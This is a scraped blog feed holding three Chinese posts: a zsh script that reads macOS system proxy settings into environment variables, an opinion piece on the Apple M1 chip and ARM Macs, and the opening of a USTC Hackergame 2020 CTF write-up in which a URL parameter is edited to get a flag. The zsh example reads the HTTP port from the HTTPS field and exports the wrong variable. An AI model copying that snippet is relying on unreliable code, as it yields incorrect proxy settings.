<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\">\n<div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-12-07</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 Cloudflare 自身还高度依赖来自 OpenResty 的 lua-nginx-module，以及与之对应的 LuauJIT，但不幸的是 LuaJIT 在当时并不支持 ARM64；除此以外，Cloudflare 许多技术还基于用 Go 编写的 RRDNS，在当时也没有 ARM64 的版本。</p>\n<p>除此以外，Cloudflare 在使用 Intel 和 Falkor 进行 OpenSSL 性能基准测试中发现，OpenSSL 公钥交换的性能高度依赖单核 CPU 频率，因此在测试中 Broadwell 竟超过 Skylake 胜出、而 Falkor 排在了垫底的位置；在对称密钥性能方面，Skylake 由于 AVX512 而遥遥领先（期间 CPU 频率甚至维持在 1.4GHz），Broadwell 由于只有 AVX2 落后于第二，而 NEON 使高通再次垫了底。而在 Cloudflare 展开的其它性能测试，如 gzip 压缩性能测试、brotli 压缩性能测试、LUAJIT 性能测试，以及 Go 的 Crypto 库、gzip 库、Go 正则表达式与字符串操作性能测试中，高通的 Falkor 都远远落后，在不少测试中性能甚至只有 Skylake 和 Broadwell 的百分之一。你可以在 <a href=\"https://blog.cloudflare.com/arm-takes-wing/\">Cloudflare 博客中找到他们的性能测试结果</a>。随后，Cloudflare 的数据中心仍旧采用基于 Intel X86 的服务器，直到今年三月，<a href=\"https://blog.cloudflare.com/technical-details-of-why-cloudflare-chose-amd-epyc-for-gen-x-servers/\">Cloudflare 将 AMD EPYC 引入了他们的新一代服务器</a>，虽然 Cloudflare 对 ARM64 满怀信心，但是他们的基础设施依然是基于 X86 的。</p>\n<p>这并不是说 ARM 具有天生的性能劣势（再看看「Fugaku」超算），而是绝大部分行业的程序、甚至是一些编程语言都不是为 ARM 设计、针对 ARM 优化的。优化软件使其能够让 ARM 的硬件完整发挥出完整的性能，还有非常漫长的一段路要走。</p>\n<h2>搭载了 M1 的 Mac 能否运行 Windows？</h2>\n<p>相比之前的长篇大论，这个问题的答案就简单多了 —— 「几乎不可能」，或者就是「不可能」。</p>\n<p>ACPI（Advanced Configuration and Power Interface，高级配置与电源接口）最早早期 1997 年由 Intel、微软、东芝共同提出，后来凤凰科技（做 BIOS 那个）和惠普先后加入规范制定中，自 2006 年起规范制定的工作被交给了 <a href=\"https://uefi.org/\">UEFI 社区</a>。Windows 98 是第一个支持 ACPI 的操作系统，Windows Vista 以后的 Windows 则要求电脑 <strong>必须支持 ACPI</strong>；Linux 虽然不需要 ACPI 也可以运行，但是在现代设备上禁用 ACPI 将会导致绝大部分硬件无法运行；就连 Android 智能设备中也内置了一个精简的 ACPI；2005 年苹果将 Mac 从 PowerPC 架构迁移到 Intel 架构（相关的故事我在另一篇文章「<a href=\"https://blog.skk.moe/post/history-osx86/\">黑苹果的历史</a>」中有详细介绍），Mac 也开始采用 ACPI。但是搭载了 iOS 的 iPhone、iPad 并没有 ACPI，苹果的智能移动设备完全使用自己的私有架构，使用名为「iBoot」的 Bootloader。</p>\n<p>从 WWDC 2020 上发布的 ARM DTK 上，通过 IORegistryExplorer 上我们可以发现运行 macOS Big Sur for ARM 的 DTK 上完全没有 ACPI。我们因此可以猜测，搭载 M1 的 Mac 也一样不存在 ACPI、使用和 iPhone、iPad 一样的 IBoot 作为 Bootloader。如果是这样的话，搭载 M1 的 Mac 上是 <strong>几乎没有可能</strong> 运行 Windows 的，甚至运行 Linux 都将非常受限。虽然不排除苹果为 ARM Mac 增加 ACPI 兼容层的可能，但是考虑到 WWDC 2020 和本次 Apple Events 上都对 BootCamp 缄口不言，基本上已经确定了本次发布的这三款搭载 M1 的 Mac 是绝无可能再运行 Windows 了。</p>\n<h2>如果搭载 M1 的 Mac 几乎没有可能直接运行 Windows，那么虚拟机呢？</h2>\n<p>相比在 X86 上提供的虚拟机增强 Feature Flag，为 ARM 提供虚拟化技术要有趣一些。ARM 虚拟化需要将 Hypervisor 插入到 Exception Level 2，然后再在 TrustZone 上提供虚拟化的功能，说人话就是 ARM 的虚拟化是在架构层面上实现的，因此苹果的 M1 如果要实现虚拟化并不难。但是考虑到苹果现在从硬件到系统都实现了完整的控制，是否提供虚拟化功能完全由苹果控制，如果苹果不启用，谁都无法绕过限制。</p>\n<p>截止到本文写就，<a href=\"https://www.parallels.com/blogs/parallels-desktop-apple-silicon-mac/\">Parallels Desktop 完全无法在 ARM Mac 上运行虚拟机</a>，但是 Parallels Desktop 已经着手对新版本的活跃开发了。考虑到虚拟机的 ACPI 实现和宿主机是完全独立的，只要苹果开放虚拟化，在 ARM Mac 上运行虚拟机是完全可行的。但是，苹果是否会选择开放虚拟化，又和苹果的目标用户战略、M1 本身的性能是相关的。</p>\n<h2>搭载了 M1 的 Mac 能否运行 PhotoShop？</h2>\n<p>这个问题的答案在发布会上有了明确的解答，我们完全无需猜测：「现在不行，不过明年就会有了」。</p>\n<p>在 WWDC 2020 上，库克就在 ARM DTK 上演示了玛雅的运行，但是对 Adobe Photoshop 却一笔带过、表示「仍在适配中」。而在这次 Apple Events 上，苹果软件部门的 SVP 克雷格·费德里吉是这么介绍的：</p>\n<blockquote>\n<p>And Adobe is bringing universal version of their Apps, staring with Lightroom next month, and other collection of apps including Photoshop early next year.</p>\n<p>而且 Adobe 也开始带来他们的通用应用，将从下个月的 Lightroom 开始，而包括 Photoshop 在内的其它应用（的 ARM 版本）则会在明年年初到来。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/7.jpg\" alt=\"7\" width=\"1280\" height=\"803\" class=\"lazy post-img\"></p>\n<p>那么，为什么大部分应用都可以很快地发布 Intel、ARM 通用版本，而 Adobe 全家桶却需要再等好几个月？因为 Adobe 从 2019 年开始大部分应用都高度依赖基于 Intel 特殊数学函数库 —— Intel Math Kernel Library（intel-mkl），以及其它一些 Intel 特殊指令集用于硬件加速（涉及到的有 MXMCore、FastCore、CameraRAW 等）。因此即使在搭载了同为 X86 的 AMD 处理器上安装黑苹果，使用 Photoshop 的某些功能也会导致闪退甚至 Kernel Panic；同理，AMD 黑苹果无法运行 MatLab，或者即使能够运行、运算速度也非常缓慢，也是由于缺乏 intel-mkl 导致的。搭载了 M1 芯片的 Mac 自然也无法调用 intel-mkl 库，因此 Adobe 需要几乎重写所有的功能实现，才能让他们的软件在 ARM Mac 上流畅运行。</p>\n<h2>如何评价率先搭载 M1 的三款 Mac？</h2>\n<p>在 Apple Events 上，苹果率先发布了三款搭载了 M1 的 Mac，其中搭载了 M1 的 MacBook Air 相比上一代搭载了 Intel i7 处理器的 MacBook Air（2020 年 3 月推出），CPU 性能提升了 3.5 倍、GPU 图形性能提升了 5 倍。但是，这是和哪一款 Intel i7 对比的呢？上市于 Q2’20 的 i7-1060NG7、Ice Lake、10nm、基础频率 1.20GHz、搭载的是 Iris Plus 核显、TDP 10W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/8.png\" alt=\"8\" width=\"982\" height=\"547\" class=\"lazy post-img\"></p>\n<p>那 Mac Mini 呢？苹果比表示搭载了 M1 的 Mac Mini 相比上一代搭载了 Intel 处理器的 Mac Mini，CPU 性能提升了 3 倍、GPU 图形性能提升了 6 倍。那么在苹果官网的脚注里写的是和哪一款 Mac Mini 进行的对比呢？对比的是于 2018 年发布的 Mac Mini，搭载了上市于 Q3’18 的 i3-8100B、Coffee Lake、14nm++、基础频率 3.6GHz（无睿频）、搭载的是臭名昭著的 UHD 630 核显，TDP 65W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/9.png\" alt=\"9\" width=\"993\" height=\"377\" class=\"lazy post-img\"></p>\n<p>苹果发布的第三款搭载 M1 的 Mac 是 MacBook Pro 13’，相比上一代搭载了 Intel i7 的 MacBook Pro 13’，CPU 性能提升 2.8 倍、GPU 图形性能提升了 5 倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\">\n<div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-11-11</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 